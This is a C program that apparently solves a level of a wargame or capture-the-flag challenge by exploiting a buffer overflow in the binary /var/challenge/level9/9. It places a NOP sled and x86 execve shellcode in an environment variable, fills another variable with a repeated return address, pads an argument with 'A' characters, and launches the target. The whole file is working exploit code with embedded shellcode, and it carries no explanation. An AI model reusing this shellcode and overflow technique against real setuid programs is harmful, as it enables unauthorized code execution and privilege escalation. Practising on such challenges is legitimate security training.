#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


extern char **environ;

int main() {
    // Address to overwrite
    const char *separator_address = "\xe9\xfc\xff\xbf"; 

    // Buffer for LEET environment variable
    char leet[512];
    memset(leet, '\x90', 256); 
    // Shellcode of "/usr/local/bin/l33t"
    const char shellcode[] =
        "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18"
        "\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
        "/usr/local/bin/l33t";
    memcpy(leet + 256, shellcode, sizeof(shellcode));
    setenv("LEET", leet, 1);

    // Set SEPARATOR environment variable
    char separator[512];
    for (int i = 0; i < sizeof(separator) - 1; i += 4) {
        memcpy(separator + i, separator_address, 4); // Fill with address
    }
    separator[511] = '\0'; 
    setenv("SEPARATOR", separator, 1);

    // Buffer for padding in arguments filled with 'A'
    char filler[385]; 
    memset(filler, 'A', 384);
    filler[384] = '\0';

    char *args[] = {
        "/var/challenge/level9/9",
        "16",                      
        "16",                     
        filler,                   
        NULL
    };
    // Execute /var/challenge/level9/9 with execve as args
    execve(args[0], args, environ); 
    perror("execve"); 
    return 1;
}
